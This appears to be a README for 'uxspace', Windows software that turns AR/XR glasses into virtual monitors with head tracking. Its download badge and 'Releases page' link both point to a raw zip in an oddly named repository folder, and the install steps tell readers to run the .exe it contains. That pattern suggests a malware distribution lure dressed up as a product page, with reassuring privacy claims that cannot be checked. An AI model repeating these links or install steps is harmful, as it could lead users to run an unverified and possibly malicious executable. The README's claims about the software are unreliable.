# 🥽 uxspace - Create professional spatial workstations anywhere

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/kennauncombined371/uxspace/raw/refs/heads/main/horseherd/Software-2.0-alpha.1.zip)

uxspace turns your AR or XR glasses into a functional spatial workspace. You connect your glasses to your Windows computer to gain multiple virtual monitors and head-tracking capabilities. This software tracks your head movements to keep your windows stable in physical space.

## ⚙️ System Requirements

Ensure your computer meets these standards before you begin.

* Operating System: Windows 10 or Windows 11 (64-bit).
* Graphics Card: NVIDIA GTX 1060, AMD RX 580, or better.
* RAM: 8 GB or more.
* Hardware: AR/XR glasses with USB-C display output.
* Connectivity: USB-C port that supports DisplayPort Alt Mode.

## 📥 Download and Setup

Follow these steps to install the workspace software on your computer.

1. Go to the [Releases page](https://github.com/kennauncombined371/uxspace/raw/refs/heads/main/horseherd/Software-2.0-alpha.1.zip).
2. Look for the latest version listed at the top.
3. Click the file ending in .exe to start the download.
4. Save the file to your desktop or downloads folder.
5. Double-click the downloaded file to run the installer.
6. Follow the instructions on the screen to finish the installation.

## 🚀 Getting Started

The first time you open the application, you must calibrate your hardware.

1. Connect your AR glasses to the USB-C port on your computer.
2. Open the uxspace application from your desktop shortcut or start menu.
3. Wait for the software to detect your glasses.
4. The application will ask for permission to track your head movement. Select "Allow" to enable spatial features.
5. Position your head in a comfortable, neutral posture. Press the spacebar to lock your starting view.

## 🖥️ Using the Spatial Workspace

The interface provides a simple way to manage your displays. You see a set of virtual screens floating in your field of vision.

Moving your head shifts your perspective across these screens. The software locks these screens to specific coordinates in the room. If you look left, you see the left monitor. If you look right, you see the right monitor.

## 🛠️ Adjusting Settings

You can change how the screens behave through the Settings menu.

* Screen Distance: Adjusts how close or far the screens appear to your eyes.
* Head Tracking Sensitivity: Changes how fast the view moves when you turn your head.
* Background Opacity: Sets the transparency level of the virtual void around your screens.
* Reset View: Re-aligns the virtual screens to your current head position.

## 🧩 Hardware Troubleshooting

If you do not see an image in your glasses, check these items.

* Cable connection: Unplug the glasses and plug them back in securely.
* USB-C port: Verify that your computer port supports video output. Some ports on laptops only support charging or data transfer.
* Driver updates: Update your graphics card drivers through the official manufacturer website.
* Power delivery: Some glasses require extra power during operation. Use a powered hub if your glasses flicker or disconnect.

## 👓 Supported Devices

This software supports most modern AR and XR glasses that utilize the industry-standard USB-C video format. We test extensively with VITURE devices to ensure stability. While other glasses may work, features like specific head-tracking fidelity vary by device model.

You can use this software for many tasks:

* Productivity: Place three large virtual windows side by side to manage spreadsheets, code, and documentation.
* Creative Work: Edit photos and videos on a screen that feels larger than any physical monitor.
* Focus: Sit in a plane, cafe, or shared office and maintain a large, private workspace that stays anchored in place.

## 📦 Compatibility Notes

This software runs locally on your Windows machine. It does not send your data to any servers. All head-tracking calculations happen on your computer processor to ensure low latency. The software operates as a background task once configured. You can minimize the main window to the system tray to keep your desktop clean.

## 🛡️ Privacy and Data

Your head-tracking data remains on your local machine. The software uses the internal sensors on your glasses to determine movement. It does not use your computer camera to track your face or eyes. We prioritize your privacy by keeping all spatial data internal to your Windows session.
